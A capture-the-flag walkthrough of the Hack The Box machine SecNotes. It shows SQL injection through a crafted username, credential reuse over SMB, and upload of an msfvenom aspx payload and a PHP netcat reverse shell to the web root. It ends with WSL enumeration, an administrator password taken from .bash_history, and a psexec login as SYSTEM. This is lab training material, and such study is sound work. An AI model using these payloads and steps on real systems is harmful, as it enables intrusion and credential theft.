---
URL: https://app.hackthebox.com/machines/151
---
## Port Scan

The initial step is to enumerate the machine and identify which ports are opened and which services are running.

```bash
$ sudo nmap -sS -p- -Pn 10.10.10.97 --min-rate=5000 -oN all
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 08:57 AEST

Nmap scan report for 10.10.10.97
Host is up (0.34s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

$ sudo nmap -sC -sV 10.10.10.97 -p80,445,8808 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 09:11 AEST
Nmap scan report for 10.10.10.97
Host is up (0.33s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2025-07-10T16:12:46-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-07-10T23:12:43
|_  start_date: N/A
|_clock-skew: mean: 2h20m34s, deviation: 4h02m33s, median: 31s
```

One interesting point to note is that sometimes the namp scan will return with all 3 above ports as filtered. Which kind of hints us that there might be a firewall/AV running on the machine.

```bash
$ sudo nmap -sC -sV 10.10.10.97 -p80,445,8808 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 09:04 AEST
Nmap scan report for 10.10.10.97
Host is up.

PORT     STATE    SERVICE       VERSION
80/tcp   filtered http
445/tcp  filtered microsoft-ds
8808/tcp filtered ssports-bcast
```

Since we see there is a web server running on port 80, we can start from there.

## Website

We are greeted with the following page when we visit the website.

![[SecNotes_login.png]]

We can try multiple methods to check whether this is vulnerable to any attacks such as brute force, default credentials, SQLi, etc. However, we also see an interesting behaviour when we try to login with a random name.

![[SecNotes_username_leak.png]]

This indicates that this error message might leak information about whether a username exists or not. Also since there is a sign up option, we can first try to use it to create an account for the moment. 

### Gaining Access

Once we have created and account and visit the home page, we see the following.

![[SecNotes_homepage.png]]

There are two important bits of information we can gather from this page. 
1. There seems to be a user named **tyler** that might have elevated privileges 
2. The website displays notes for users probably by querying a db in the backend

### SQLi

Since there might be an SQL query running to fetch the data, we can try to inject this via our username. 

We try to create a user with the username `' or 1 or '` and the user account is successfully created. When we login as that user, we see the following information.

![[SecNotes_SQLi.png]]

It seems like the app is displaying all user notes available in the webserver. Within the notes we see an username and a password that seems to belong to as SMB share of tyler. 

Since we know SMB is up in this server from the port scan, we can try to login to SMB using this set of credentials.

## SMB Share

We use `smbclient` to connect to the share and it is successful.

```bash
$ smbclient -U tyler%'92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Aug 20 04:06:14 2018
  ..                                  D        0  Mon Aug 20 04:06:14 2018
  iisstart.htm                        A      696  Fri Jun 22 01:26:03 2018
  iisstart.png                        A    98757  Fri Jun 22 01:26:03 2018

                7736063 blocks of size 4096. 3394107 blocks available
```

From the directory listing, this looks like a default IIS site, and form our port scan we know there is an IIS server running on port `8808`. We can try to visit this port from the browser and see whether it is accessible to us.

![[SecNotes_IIS.png]]

### Upload Revshell

Since we have access to the server directory, we can upload a script using SMB to try to spawn a reverse shell to our machine.

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=6666 -f aspx > manual.aspx        
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2724 bytes

$ smbclient -U tyler%'92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site
Try "help" to get a list of possible commands.
smb: \> put manual.aspx 
putting file manual.aspx as \manual.aspx (1.3 kb/s) (average 1.3 kb/s)
```

However, when we try to run the payload via the browser we get the following error.

![[SecNotes_msfvenom.png]]

This the payload we generated is not working (probably due to the AV intervening), we next try to gain a reverse shell using netcat and PHP. In order to do this we need to upload both a `nc.exe` and a php script. 

```bash
$ locate nc.exe   
/usr/share/windows-resources/binaries/nc.exe

$ cp /usr/share/windows-resources/binaries/nc.exe ./ 

$ cat rev.php                                                       
<?php
system('nc.exe -e cmd.exe 10.10.14.19 6666')
?>

$ smbclient -U tyler%'92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site
Try "help" to get a list of possible commands.

smb: \> put rev.php 
putting file rev.php as \rev.php (0.1 kb/s) (average 0.9 kb/s)
smb: \> put nc.exe 
putting file nc.exe as \nc.exe (21.0 kb/s) (average 10.5 kb/s)
smb: \> ls
  .                                   D        0  Fri Jul 11 10:14:40 2025
  ..                                  D        0  Fri Jul 11 10:14:40 2025
  iisstart.htm                        A      696  Fri Jun 22 01:26:03 2018
  iisstart.png                        A    98757  Fri Jun 22 01:26:03 2018
  manual.aspx                         A     2724  Fri Jul 11 10:13:55 2025
  nc.exe                              A    59392  Fri Jul 11 10:14:43 2025
  rev.php                             A       54  Fri Jul 11 10:14:36 2025
```

Now we need to start a listener on port 6666 and visit the `rev.php` resource.

## User Enumeration

```bash
$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.97] 49915
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami 
whoami
secnotes\tyler

C:\inetpub\new-site>systeminfo
systeminfo
ERROR: Access denied
```

Since `systeminfo` is denied, we can be pretty sure there is an AV running. If we check for Windows Defender, we see that it is indeed running..

```PowerShell
C:\inetpub\new-site> sc query windefend
sc query windefend

SERVICE_NAME: windefend 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

### WSL

Once we move to tyler's desktop, we see there are fe `.lnk` files available. More specifically, bash seems to be available in windows. This suggests that there might be `WSL` running on this machine.

```PowerShell
C:\inetpub\new-site>cd ../../Users/tyler/Desktop

C:\Users\tyler\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\Users\tyler\Desktop

08/19/2018  03:51 PM    <DIR>          .
08/19/2018  03:51 PM    <DIR>          ..
06/22/2018  03:09 AM             1,293 bash.lnk
08/02/2021  03:32 AM             1,210 Command Prompt.lnk
04/11/2018  04:34 PM               407 File Explorer.lnk
06/21/2018  05:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  09:17 AM             1,110 Notepad++.lnk
07/11/2025  06:11 PM                34 user.txt
08/19/2018  10:59 AM             2,494 Windows PowerShell.lnk
               7 File(s)          7,965 bytes
               2 Dir(s)  13,913,698,304 bytes free

C:\Users\tyler\Desktop>type bash.lnk
L�F w������V�   �v(���  ��9P�O� �:i�+00�/C:\V1�LIWindows@       ﾋL���LI.h���&WindowsZ1�L<System32B      ﾋL���L<.p�k�System32▒Z2��LP� bash.exeB  ﾋL<��LU.�Y����bash.exe▒K-JںݜC:\Windows\System32\bash.exe"..\..\..\Windows\System32\bash.exeC:\Windows\System32�%�
                                                                                                     �wN�▒�]N�D.��Q���`�Xsecnotesx�<sAA��㍧�o�:u��'�/�x�<sAA��㍧�o�:u��'�/�=        �Y1SPS�0��C�G����sf"=dSystem32 (C:\Windows)�1SPS��XF�L8C���&�m�q/S-1-5-21-1791094074-1363918840-4199337083-1002�1SPS0�%��G▒��`����%
        bash.exe@������
                       �)
                         Application@v(���      �i1SPS�jc(=�����O�▒�MC:\Windows\System32\bash.exe91SPS�mD��pH�H@.�=x�hH�(�bP
```

We can search for the `bash.exe` on the file system and use it to gain access to the `WSL` system.

```PowerShell
C:\Users\tyler\Desktop>where /R c:\windows bash.exe
where /R c:\windows bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe

C:\Users\tyler\Desktop>where /R c:\windows wsl     
where /R c:\windows wsl
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe

C:\Users\tyler\Desktop>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
mesg: ttyname failed: Inappropriate ioctl for device

id
uid=0(root) gid=0(root) groups=0(root)
```

### .bash_history
Even though we are the `root` user on WSL, we still do not have administrator acess on the box.

```bash
cd /mnt/c

ls
$Recycle.Bin
BOOTNXT
Config.Msi
Distros
Documents and Settings
Microsoft
PerfLogs
Program Files
Program Files (x86)
ProgramData
Recovery
System Volume Information
Ubuntu.zip
Users
Windows
bootmgr
inetpub
pagefile.sys
php7
swapfile.sys

cd Users/Administrator
ls
ls: cannot open directory '.': Permission denied
```

We can begin enumeration by checking the `.bash_history` of this user.

```bash
cd ~
ls -la
total 8
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem

cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exit
```

Within the history, we see there is a command that was run by this user with the administrator password. We can use this with `psexec` to gain access to the machine as an Administrator.

## PWNED

```bash
$ python psexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file CMsJsWyC.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service YimE on 10.10.10.97.....
[*] Starting service YimE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
i(c) 2018 Microsoft Corporation. All rights reserved.
 
C:\WINDOWS\system32> whoami
nt authority\system
```

We have successfully pawned the machine!